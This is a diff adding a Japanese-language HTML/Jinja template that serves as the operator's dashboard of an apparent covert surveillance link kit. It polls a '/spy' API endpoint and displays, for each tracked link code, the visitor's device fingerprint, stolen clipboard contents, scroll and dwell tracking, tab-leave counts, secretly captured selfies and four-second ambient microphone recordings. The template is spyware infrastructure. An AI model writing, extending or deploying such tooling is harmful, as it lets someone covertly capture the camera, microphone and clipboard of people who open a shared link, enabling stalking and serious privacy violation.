@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="ja"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{ link.name }} — 解析</title>
+<style>
+html,body{margin:0;background:#0f1115;color:#e6e9ef;
+  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;padding:14px}
+h1{font-size:18px}
+h3{font-size:14px;margin:18px 0 6px;color:#c7cddb}
+.dim{color:#8b93a7;font-size:12px;line-height:1.8}
+.mono{font-family:ui-monospace,Menlo,monospace;font-size:12px;color:#8b93a7}
+.card{background:#171a21;border:1px solid #262b36;border-radius:10px;padding:12px;margin:8px 0}
+a.btn,button{padding:7px 13px;border-radius:8px;background:#2b3346;color:#e6e9ef;
+  text-decoration:none;font-size:12px;border:1px solid #39415a;cursor:pointer}
+.row{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th,td{text-align:left;padding:4px 6px;border-bottom:1px solid #232734;vertical-align:top}
+.gal{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px}
+.gal img{width:100%;border-radius:8px;background:#000}
+audio{width:100%;margin:4px 0}
+pre{white-space:pre-wrap;word-break:break-all;font-size:11.5px;color:#9aa3b2;
+  background:#11141a;border:1px solid #232734;border-radius:8px;padding:10px;margin:0}
+</style></head><body>
+
+<h1>{{ link.name }} <span class="mono">{{ code }}</span> — 解析</h1>
+<div class="row">
+  <a class="btn" href="{{ base }}/gp/{{ code }}">← 監視室</a>
+  <a class="btn" href="{{ share }}" target="_blank">開く（相手の画面）</a>
+  <a class="btn" href="{{ base }}/gp">一覧</a>
+</div>
+
+<h3>端末指紋（最新）</h3>
+<div class="card"><pre id="dev">読み込み中…</pre></div>
+
+<h3>クリップボード（最新）</h3>
+<div class="card"><pre id="clip">-</pre></div>
+
+<h3>滞在・スクロール（新しい順）</h3>
+<table><tr><th>時刻</th><th>滞在(ms)</th><th>スクロール</th><th>訪問回数</th><th>画面</th></tr>
+<tbody id="dwell"></tbody></table>
+<div class="dim">タブ離脱回数: <span id="blur">0</span></div>
+
+<h3>自撮り</h3>
+<div class="gal" id="selfies"></div>
+<div class="dim" id="selfieinfo">まだありません</div>
+
+<h3>環境音（4秒）</h3>
+<div id="voices"></div>
+<div class="dim" id="voiceinfo">まだありません</div>
+
+<h3>イベント全部（新しい順 200件）</h3>
+<table><tr><th>時刻</th><th>種別</th><th>値</th><th>内容</th></tr><tbody id="ev"></tbody></table>
+
+<script>
+(function () {
+  var CODE = {{ code|tojson }};
+  function esc(s) {
+    return String(s == null ? "" : s).replace(/[&<>"]/g, function (c) {
+      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c];
+    });
+  }
+  function pretty(t) {
+    try { return JSON.stringify(JSON.parse(t), null, 1); } catch (e) { return t; }
+  }
+  function load() {
+    fetch("/api/gp/" + encodeURIComponent(CODE) + "/spy", { cache: "no-store" })
+      .then(function (r) { return r.json(); })
+      .then(function (j) {
+        var d = j.device;
+        document.getElementById("dev").textContent =
+          d ? (d.ts + "\n" + pretty(d.text)) : "まだありません";
+        document.getElementById("clip").textContent =
+          j.clip ? (j.clip.ts + "\n" + j.clip.text) : "-";
+        document.getElementById("blur").textContent = j.blur || 0;
+
+        var h = "";
+        (j.dwell || []).forEach(function (e) {
+          var o = {};
+          try { o = JSON.parse(e.text || "{}"); } catch (err) {}
+          h += "<tr><td class=mono>" + (e.ts || "").slice(5, 19) + "</td><td>" +
+               Math.round(e.value || 0) + "</td><td>" +
+               (o.scroll != null ? o.scroll + "%" : "-") + "</td><td>" +
+               (o.visits || "-") + "</td><td>" + esc(o.screen || "-") + "</td></tr>";
+        });
+        document.getElementById("dwell").innerHTML = h;
+
+        var g = "";
+        (j.selfies || []).forEach(function (m) {
+          g += '<div><img src="' + m.data + '" alt=""><div class=dim>' +
+               (m.ts || "").slice(5, 19) + "</div></div>";
+        });
+        document.getElementById("selfies").innerHTML = g;
+        document.getElementById("selfieinfo").textContent =
+          (j.selfies || []).length ? (j.selfies.length + "枚") : "まだありません";
+
+        var v = "";
+        (j.voices || []).forEach(function (m) {
+          v += '<div><audio controls src="' + m.data + '"></audio><div class=dim>' +
+               (m.ts || "").slice(5, 19) + " / " + (m.ms || 0) + "ms</div></div>";
+        });
+        document.getElementById("voices").innerHTML = v;
+        document.getElementById("voiceinfo").textContent =
+          (j.voices || []).length ? (j.voices.length + "件") : "まだありません";
+
+        var t = "";
+        (j.events || []).forEach(function (e) {
+          t += "<tr><td class=mono>" + (e.ts || "").slice(5, 19) + "</td><td>" +
+               esc(e.kind) + "</td><td>" + Math.round(e.value || 0) + "</td><td>" +
+               esc((e.text || "").slice(0, 300)) + "</td></tr>";
+        });
+        document.getElementById("ev").innerHTML = t;
+      }).catch(function () {});
+  }
+  load();
+  setInterval(load, 6000);
+})();
+</script>
+</body></html>
